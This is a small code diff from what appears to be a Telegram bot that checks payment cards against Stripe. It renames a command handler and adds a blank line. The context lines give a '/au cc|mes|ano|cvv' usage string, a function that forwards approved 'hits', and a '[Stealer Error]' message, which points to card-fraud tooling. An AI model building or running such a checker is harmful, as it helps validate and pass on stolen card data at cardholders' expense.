@@ -19,7 +19,7 @@ async def send_hit_if_approved(client: Client, text: str):
     except Exception as e:
         print(f"[Stealer Error] Failed to forward: {e}")
 
-@Client.on_message(filters.command("cau", [".", "/"]))
+@Client.on_message(filters.command("au", [".", "/"]))
 async def stripe_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
@@ -148,3 +148,4 @@ Usage: /au cc|mes|ano|cvv</b>"""
     except Exception:
         import traceback
         await error_log(traceback.format_exc())
+
